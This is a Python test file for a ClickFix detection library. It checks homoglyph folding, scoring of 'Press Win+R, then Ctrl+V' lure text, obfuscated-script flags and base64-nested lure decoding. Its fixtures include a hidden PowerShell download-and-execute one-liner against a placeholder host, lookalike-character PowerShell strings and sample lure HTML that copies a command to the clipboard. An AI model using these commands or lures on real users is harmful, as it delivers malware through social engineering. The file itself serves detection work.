"""Tests for the ClickFix pattern library (homoglyphs, lure instructions).

Patterns adapted from MHaggis/ClickGrab (Apache-2.0).
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

from config import SanitizeConfig  # noqa: E402
from extractor import extract_from_text, looks_like_command  # noqa: E402
from lurepatterns import (  # noqa: E402
    clickfix_instruction_score,
    contains_homoglyphs,
    fold_homoglyphs,
    looks_obfuscated,
    normalize_for_detection,
    strip_invisible,
)
from sanitize import evaluate  # noqa: E402


class TestHomoglyphs(unittest.TestCase):
    def test_cyrillic_powershell_folds_to_ascii(self):
        self.assertEqual(fold_homoglyphs("роwershell"), "powershell")

    def test_greek_lookalikes(self):
        self.assertEqual(fold_homoglyphs("ροwershell"), "powershell")

    def test_detection_survives_homoglyphs(self):
        # Without folding this scores zero and gets dropped as noise.
        self.assertTrue(looks_like_command("роwershell -w hidden"))

    def test_contains_homoglyphs_flag(self):
        self.assertTrue(contains_homoglyphs("роwershell"))
        self.assertFalse(contains_homoglyphs("powershell"))

    def test_ascii_is_unchanged(self):
        cmd = 'powershell -w hidden -nop -c "iex(irm http://x/a)"'
        self.assertEqual(normalize_for_detection(cmd), cmd)

    def test_invisible_characters_stripped(self):
        self.assertEqual(strip_invisible("power​shell"), "powershell")

    def test_submitted_command_keeps_original_bytes(self):
        # DETECTION folds homoglyphs; SUBMISSION must not. The guest should
        # execute exactly what a victim would paste.
        raw = "роwershell -w hidden"
        r = evaluate(raw, SanitizeConfig())
        self.assertIn("роwershell", r.normalized_text)
        self.assertGreaterEqual(r.score, 1)
        self.assertTrue(r.homoglyphs_detected)
        self.assertIn("homoglyphs_present", r.reasons)


class TestLureInstructions(unittest.TestCase):
    def test_win_r_sequence_scores(self):
        score, hits = clickfix_instruction_score("Press Win+R, then Ctrl+V, then Enter")
        self.assertGreaterEqual(score, 5)
        self.assertIn("win_r", hits)
        self.assertIn("ctrl_v", hits)

    def test_windows_key_variant(self):
        score, hits = clickfix_instruction_score("Press the Windows logo key, then paste")
        self.assertIn("win_key", hits)

    def test_mac_variant(self):
        score, hits = clickfix_instruction_score("Press Command+V in Terminal")
        self.assertIn("cmd_v", hits)

    def test_benign_page_scores_zero(self):
        score, hits = clickfix_instruction_score("<h1>Our Products</h1><p>Buy now</p>")
        self.assertEqual(score, 0)
        self.assertEqual(hits, [])

    def test_instructions_detected_through_homoglyphs(self):
        score, _ = clickfix_instruction_score("Рress Win+R then Сtrl+V")
        self.assertGreater(score, 0)

    def test_lure_score_recorded_on_extract_result(self):
        html = (
            "<h1>Verify you are human</h1><p>Press Win+R then Ctrl+V then Enter</p>"
            '<script>navigator.clipboard.writeText("powershell -nop");</script>'
        )
        r = extract_from_text(html)
        self.assertGreaterEqual(r.lure_score, 5)
        self.assertIn("win_r", r.lure_hits)

    def test_benign_captcha_has_low_lure_score(self):
        html = '<h1>Verify you are human</h1><input type="checkbox">'
        r = extract_from_text(html)
        self.assertLess(r.lure_score, 4)


class TestObfuscationDetection(unittest.TestCase):
    def test_packed_bundle_detected(self):
        js = "var _0x1a2b=1; var _0x3c4d=2; function _0x5e6f(){}"
        self.assertTrue(looks_obfuscated(js))

    def test_normal_js_not_flagged(self):
        self.assertFalse(looks_obfuscated("function copyText(){ return 1; }"))

    def test_obfuscated_flag_on_result(self):
        html = (
            "<script>var _0x1a2b='a';var _0x3c4d='b';var _0x5e6f='c';"
            'navigator.clipboard.writeText("powershell -nop");</script>'
        )
        self.assertTrue(extract_from_text(html).obfuscated_bundle)


class TestNestedDecoding(unittest.TestCase):
    def test_base64_containing_a_whole_lure_block(self):
        import base64

        inner = '<textarea>powershell -w hidden -nop</textarea>'
        blob = base64.b64encode(inner.encode()).decode()
        html = f'<script>var page = atob("{blob}"); document.body.innerHTML = page;</script>'
        r = extract_from_text(html)
        self.assertIsNotNone(r.command_text)
        self.assertIn("powershell", r.command_text.lower())


if __name__ == "__main__":
    unittest.main(verbosity=2)
